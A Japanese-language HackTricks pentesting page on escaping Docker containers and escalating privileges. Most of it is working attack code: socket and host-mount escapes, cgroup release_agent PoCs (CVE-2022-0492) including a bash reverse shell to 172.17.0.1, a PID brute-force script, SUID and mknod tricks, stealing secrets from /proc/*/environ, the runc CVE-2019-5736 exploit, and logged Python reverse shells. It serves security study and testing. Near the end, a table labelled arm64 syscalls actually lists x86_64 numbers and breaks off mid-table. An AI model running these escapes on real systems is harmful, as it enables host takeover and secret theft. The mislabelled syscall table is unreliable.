# Dockerの脱獄/特権エスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 自動列挙と脱出

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): コンテナの列挙も可能です
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): このツールは、現在のコンテナを列挙するのに非常に便利であり、自動的に脱出を試みることもできます
* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持つ特権を取得するための便利なツールで、脱出方法を見つけることができます
* [**deepce**](https://github.com/stealthcopter/deepce): コンテナの列挙と脱出のためのツール
* [**grype**](https://github.com/anchore/grype): イメージにインストールされているソフトウェアに含まれるCVEを取得します

## マウントされたDockerソケットの脱出

もし、Dockerコンテナ内に**Dockerソケットがマウントされている**ことがわかった場合、それから脱出することができます。\
これは通常、何らかの理由でDockerコンテナがDockerデーモンに接続してアクションを実行する必要がある場合に起こります。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
この場合、通常のDockerコマンドを使用してDockerデーモンと通信することができます。
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
予期しない場所に**dockerソケット**がある場合は、パラメータ**`-H unix:///path/to/docker.sock`**を使用して**`docker`**コマンドを使用してそれと通信することができます。
{% endhint %}

Dockerデーモンは、[ポート（デフォルトでは2375、2376）でリスニングすることもあります](../../../../network-services-pentesting/2375-pentesting-docker.md)。また、Systemdベースのシステムでは、Dockerデーモンとの通信はSystemdソケット`fd://`を介して行われる場合があります。

{% hint style="info" %}
さらに、他のハイレベルランタイムのランタイムソケットにも注意してください：

* dockershim：`unix:///var/run/dockershim.sock`
* containerd：`unix:///run/containerd/containerd.sock`
* cri-o：`unix:///var/run/crio/crio.sock`
* frakti：`unix:///var/run/frakti.sock`
* rktlet：`unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilitiesの悪用からの脱出

コンテナのcapabilitiesをチェックする必要があります。以下のいずれかのcapabilitiesがある場合、それから脱出することができるかもしれません：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE, CAP_SYS_RAWIO`**、**`CAP_SYSLOG`**、**`CAP_NET_RAW`**、**`CAP_NET_ADMIN`**

現在のコンテナのcapabilitiesは、**前述の自動ツール**または次のコマンドを使用して確認できます：
```bash
capsh --print
```
以下のページでは、Linuxの機能について詳しく学び、それらを悪用して特権を逃れたり特権をエスカレートさせたりする方法について学ぶことができます。

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## 特権コンテナからの脱出

特権コンテナは、`--privileged`フラグを使用するか、特定の防御を無効にすることで作成できます。

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

`--privileged`フラグは、重大なセキュリティ上の懸念を引き起こし、このフラグを有効にした状態でDockerコンテナを起動することによってエスケープを行います。このフラグを使用すると、コンテナはすべてのデバイスに完全なアクセス権を持ち、seccomp、AppArmor、およびLinuxの機能の制限がありません。`--privileged`の効果については、次のページで詳しく説明されています。

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 特権 + hostPID

これらの権限を持つ場合、単に`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`を実行することで、ホストでrootとして実行されているプロセス（init、pid:1）の名前空間に移動することができます。

コンテナでテストしてみてください。
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### 特権モード

特権フラグを使用するだけで、ホストのディスクにアクセスしたり、release_agentや他のエスケープを悪用して脱出を試みることができます。

以下のバイパスをコンテナでテストしてください。
```bash
docker run --rm -it --privileged ubuntu bash
```
#### ディスクのマウント - Poc1

適切に設定されたDockerコンテナでは、**fdisk -l**のようなコマンドは許可されません。ただし、誤って設定されたDockerコマンドで、`--privileged`フラグまたは`--device=/dev/sda1`フラグが指定されている場合、ホストドライブを表示するための特権を取得することができます。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

したがって、ホストマシンを乗っ取ることは簡単です。
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
そして、できあがり！ホストのファイルシステムにアクセスできるようになりました。これは、`/mnt/hola`フォルダにマウントされています。

#### ディスクのマウント - Poc2

コンテナ内では、攻撃者はクラスタによって作成された書き込み可能なhostPathボリュームを介して、基礎となるホストOSへのさらなるアクセスを試みることがあります。以下は、この攻撃ベクトルを利用しているかどうかを確認するためにコンテナ内でチェックできる一般的な項目です。
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 特権エスケープ - 既存のrelease\_agentの悪用（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC1

{% code title="初期のPoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### 特権エスケープ：作成されたrelease_agentの悪用（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC2

{% code title="セカンドPoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

以下は、特権エスケープの説明があります：

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### プライビリージエスケープ：相対パスが不明な場合のrelease\_agentの悪用 - PoC3

以前の攻撃では、**ホストのファイルシステム内のコンテナの絶対パスが公開**されていました。しかし、常にそうではありません。ホスト内のコンテナの**絶対パスがわからない場合**には、このテクニックを使用できます：

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
特権付きコンテナ内でPoCを実行すると、次のような出力が得られるはずです。
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 特権エスケープと感度の高いマウントの悪用

**ホストの基礎情報を提供する可能性のあるいくつかのマウントされたファイル**があります。これらのファイルのいくつかは、**ホストが何かが起こったときに実行するものを示す場合さえもあります**（これにより攻撃者はコンテナから脱出することができます）。

これらのファイルの悪用により、次のことが可能になります：

- release_agent（すでに前述済み）
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

ただし、このページでチェックするための**他の感度の高いファイル**も見つけることができます：

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 任意のマウント

いくつかの場合、**コンテナにはホストからのボリュームがマウントされている**ことがあります。このボリュームが正しく設定されていない場合、**感度の高いデータにアクセス/変更することができる**可能性があります：シークレットの読み取り、sshのauthorized_keysの変更...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2つのシェルとホストマウントによる特権昇格

もし、ホストからマウントされたフォルダを持つコンテナ内で**rootとしてアクセス**でき、かつ**非特権ユーザーとしてホストにエスケープ**し、マウントされたフォルダに対して読み取りアクセス権を持っている場合、\
コンテナ内の**マウントされたフォルダ**に**bash suidファイル**を作成し、ホストからそれを実行することで特権昇格が可能です。
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2つのシェルを使用した特権昇格

もし、**コンテナ内でrootとしてアクセス**でき、かつ**非特権ユーザーとしてホストから脱出**できた場合、コンテナ内での特権昇格を行うために両方のシェルを悪用することができます。これは、コンテナ内でのデフォルトの機能であるMKNODの機能を利用することができるためです。詳細は[**この記事**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)で説明されています。\
この機能により、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することが許可されます。デバイスファイルは、**ハードウェアやカーネルモジュールにアクセス**するために使用される特殊なファイルです。たとえば、/dev/sdaのブロックデバイスファイルは、システムディスクの生データを**読み取るためのアクセス**を提供します。

Dockerは、ブロックデバイスが**コンテナ内から悪用されないように**するために、コンテナに対してcgroupポリシーを設定してブロックデバイスの読み書きをブロックします。\
ただし、もしブロックデバイスが**コンテナ内で作成された場合、外部の誰かがコンテナの外部から/proc/PID/root/フォルダを介してアクセス**することができます。ただし、そのプロセスはコンテナの外部と内部で**同じユーザーによって所有されている必要があります**。

**悪用**の例は、この[**解説記事**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)から引用されています。
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

ホストのプロセスにアクセスできる場合、それらのプロセスに格納されている多くの機密情報にアクセスできます。テストラボを実行します：
```
docker run --rm -it --pid=host ubuntu bash
```
たとえば、`ps auxn`のようなコマンドを使用してプロセスをリストアップし、コマンド内の機密情報を検索することができます。

次に、**/proc/内のホストの各プロセスにアクセスできるため、envの秘密情報を盗むことができます**。以下のコマンドを実行してください。
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
他のプロセスのファイルディスクリプタにアクセスし、それらのオープンされたファイルを読むこともできます。
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
あなたはまた、プロセスを**終了させてDoSを引き起こす**こともできます。

{% hint style="warning" %}
もし、コンテナの外部のプロセスに特権のある**アクセス権限を持っている場合**、`nsenter --target <pid> --all`または`nsenter --target <pid> --mount --net --pid --cgroup`のようなコマンドを実行して、**そのプロセスと同じns制限**（おそらくなし）**を持つシェルを実行する**ことができます。
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
もしコンテナがDockerの[ホストネットワーキングドライバ(`--network=host`)](https://docs.docker.com/network/host/)で設定されている場合、そのコンテナのネットワークスタックはDockerホストから分離されていません（コンテナはホストのネットワーキング名前空間を共有しています）し、コンテナには独自のIPアドレスが割り当てられません。言い換えると、**コンテナはすべてのサービスを直接ホストのIPにバインド**します。さらに、コンテナは共有インターフェース上でホストが送受信している**すべてのネットワークトラフィックを傍受**することができます（`tcpdump -i eth0`を使用）。

例えば、次のような場合に使用できます：

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

また、ホスト内部から**localhostにバインドされたネットワークサービスにアクセス**したり、ノードの**メタデータの権限にアクセス**することもできます（これはコンテナがアクセスできるものとは異なる場合があります）。

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
もし`hostIPC=true`しか持っていない場合、あなたはほとんど何もできません。ホスト上のプロセスまたは他のポッド内のプロセスがホストの**プロセス間通信メカニズム**（共有メモリ、セマフォ配列、メッセージキューなど）を使用している場合、それらのメカニズムに読み書きすることができます。最初に調べるべき場所は`/dev/shm`です。なぜなら、`hostIPC=true`を持つ任意のポッドとホストで共有されているからです。また、`ipcs`を使用して他のIPCメカニズムもチェックする必要があります。

* **/dev/shmの調査** - この共有メモリの場所にあるファイルを調べてください：`ls -la /dev/shm`
* **既存のIPC施設の調査** - `/usr/bin/ipcs`を使用して使用されているIPC施設があるかどうかを確認できます。次のコマンドで確認してください：`ipcs -a`

### 権限の回復

もし`unshare`システムコールが禁止されていない場合、次のコマンドを実行してすべての権限を回復することができます：
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### シンボリックリンクを介したユーザーネームスペースの乱用

[https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)の記事で説明されている2番目のテクニックでは、ユーザーネームスペースを使用してバインドマウントを乱用し、ホスト内のファイル（特定の場合はファイルの削除）に影響を与える方法が示されています。

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって**パワード**されたワークフローを簡単に構築して**自動化**できます。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE

### Runc exploit (CVE-2019-5736)

`docker exec`をrootとして実行できる場合（おそらくsudoで実行できる場合）、CVE-2019-5736を乱用して特権を昇格させることができます（[ここ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)にあるexploitを使用します）。このテクニックは、基本的には**コンテナからホストの/bin/shバイナリを上書き**し、docker execを実行するとペイロードがトリガーされます。

ペイロードを適宜変更し、`go build main.go`でmain.goをビルドします。ビルドされたバイナリは、実行のためにdockerコンテナに配置する必要があります。\
実行すると、`[+] Overwritten /bin/sh successfully`と表示されると、ホストマシンから次のコマンドを実行する必要があります：

`docker exec -it <container-name> /bin/sh`

これにより、main.goファイルに存在するペイロードがトリガーされます。

詳細については、[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)を参照してください。

{% hint style="info" %}
コンテナが脆弱である可能性のある他のCVEも存在します。リストは[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)で確認できます。
{% endhint %}

## Dockerカスタムエスケープ

### Dockerエスケープの対象範囲

* **ネームスペース**：プロセスはネームスペースによって他のプロセスと完全に分離されるため、ネームスペースによる他のプロセスとの相互作用を回避することはできません（デフォルトでは、IPCs、UNIXソケット、ネットワークサービス、D-Bus、他のプロセスの/procを介した通信はできません）。
* **ルートユーザー**：デフォルトでは、プロセスを実行するユーザーはルートユーザーです（ただし、権限は制限されています）。
* **機能**：Dockerは次の機能を残します：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **シスコール**：これらはルートユーザーが呼び出せないシスコールです（機能の不足+Seccompのため）。他のシスコールを使用してエスケープを試みることができます。

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

以下は、arm64アーキテクチャで使用されるシステムコールの一覧です。

| システムコール番号 | システムコール名 |
|------------------|----------------|
| 0 | read |
| 1 | write |
| 2 | open |
| 3 | close |
| 4 | stat |
| 5 | fstat |
| 6 | lstat |
| 7 | poll |
| 8 | lseek |
| 9 | mmap |
| 10 | mprotect |
| 11 | munmap |
| 12 | brk |
| 13 | rt_sigaction |
| 14 | rt_sigprocmask |
| 15 | rt_sigreturn |
| 16 | ioctl |
| 17 | pread64 |
| 18 | pwrite64 |
| 19 | readv |
| 20 | writev |
| 21 | access |
| 22 | pipe |
| 23 | select |
| 24 | sched_yield |
| 25 | mremap |
| 26 | msync |
| 27 | mincore |
| 28 | madvise |
| 29 | shmget |
| 30 | shmat |
| 31 | shmctl |
| 32 | dup |
| 33 | dup2 |
| 34 | pause |
| 35 | nanosleep |
| 36 | getitimer |
| 37 | alarm |
| 38 | setitimer |
| 39 | getpid |
| 40 | sendfile |
| 41 | socket |
| 42 | connect |
| 43 | accept |
| 44 | sendto |
| 45 | recvfrom |
| 46 | sendmsg |
| 47 | recvmsg |
| 48 | shutdown |
| 49 | bind |
| 50 | listen |
| 51 | getsockname |
| 52 | getpeername |
| 53 | socketpair |
| 54 | setsockopt |
| 55 | getsockopt |
| 56 | clone |
| 57 | fork |
| 58 | vfork |
| 59 | execve |
| 60 | exit |
| 61 | wait4 |
| 62 | kill |
| 63 | uname |
| 64 | semget |
| 65 | semop |
| 66 | semctl |
| 67 | shmdt |
| 68 | msgget |
| 69 | msgsnd |
| 70 | msgrcv |
| 71 | msgctl |
| 72 | fcntl |
| 73 | flock |
| 74 | fsync |
| 75 | fdatasync |
| 76 | truncate |
| 77 | ftruncate |
| 78 | getdents |
| 79 | getcwd |
| 80 | chdir |
| 81 | fchdir |
| 82 | rename |
| 83 | mkdir |
| 84 | rmdir |
| 85 | creat |
| 86 | link |
| 87 | unlink |
| 88 | symlink |
| 89 | readlink |
| 90 | chmod |
| 91 | fchmod |
| 92 | chown |
| 93 | fchown |
| 94 | lchown |
| 95 | umask |
| 96 | gettimeofday |
| 97 | getrlimit |
| 98 | getrusage |
| 99 | sysinfo |
| 100 | times |
| 101 | ptrace |
| 102 | getuid |
| 103 | syslog |
| 104 | getgid |
| 105 | setuid |
| 106 | setgid |
| 107 | geteuid |
| 108 | getegid |
| 109 | setpgid |
| 110 | getppid |
| 111 | getpgrp |
| 112 | setsid |
| 113 | setreuid |
| 114 | setregid |
| 115 | getgroups |
| 116 | setgroups |
| 117 | setresuid |
| 118 | getresuid |
| 119 | setresgid |
| 120 | getresgid |
| 121 | getpgid |
| 122 | setfsuid |
| 123 | setfsgid |
| 124 | getsid |
| 125 | capget |
| 126 | capset |
| 127 | rt_sigpending |
| 128 | rt_sigtimedwait |
| 129 | rt_sigqueueinfo |
| 130 | rt_sigsuspend |
| 131 | sigaltstack |
| 132 | utime |
| 133 | mknod |
| 134 | uselib |
| 135 | personality |
| 136 | ustat |
| 137 | statfs |
| 138 | fstatfs |
| 139 | sysfs |
| 140 | getpriority |
| 141 | setpriority |
| 142 | sched_setparam |
| 143 | sched_getparam |
| 144 | sched_setscheduler |
| 145 | sched_getscheduler |
| 146 | sched_get_priority_max |
| 147 | sched_get_priority_min |
| 148 | sched_rr_get_interval |
| 149 | mlock |
| 150 | munlock |
| 151 | mlockall |
| 152 | munlockall |
| 153 | vhangup |
| 154 | modify_ldt |
| 155 | pivot_root |
| 156 | _sysctl |
| 157 | prctl |
| 158 | arch_prctl |
| 159 | adjtimex |
| 160 | setrlimit |
| 161 | chroot |
| 162 | sync |
| 163 | acct |
| 164 | settimeofday |
| 165 | mount |
| 166 | umount2 |
| 167 | swapon |
| 168 | swapoff |
| 169 | reboot |
| 170 | sethostname |
| 171 | setdomainname |
| 172 | iopl |
| 173 | ioperm |
| 174 | create_module |
| 175 | init_module |
| 176 | delete_module |
| 177 | get_kernel_syms |
| 178 | query_module |
| 179 | quotactl |
| 180 | nfsservctl |
| 181 | getpmsg |
| 182 | putpmsg |
| 183 | afs_syscall |
| 184 | tuxcall |
| 185 | security |
| 186 | gettid |
| 187 | readahead |
| 188 | setxattr |
| 189 | lsetxattr |
| 190 | fsetxattr |
| 191 | getxattr |
| 192 | lgetxattr |
| 193 | fgetxattr |
| 194 | listxattr |
| 195 | llistxattr |
| 196 | flistxattr |
| 197 | removexattr |
| 198 | lremovexattr |
| 199 | fremovexattr |
| 200 | tkill |
| 201 | time |
| 202 | futex |
| 203 | sched_setaffinity |
| 204 | sched_getaffinity |
| 205 | set_thread_area |
| 206 | io_setup |
| 207 | io_destroy |
| 208 | io_getevents |
| 209 | io_submit |
| 210 | io_cancel |
| 211 | get_thread_area |
| 212 | lookup_dcookie |
| 213 | epoll_create |
| 214 | epoll_ctl_old |
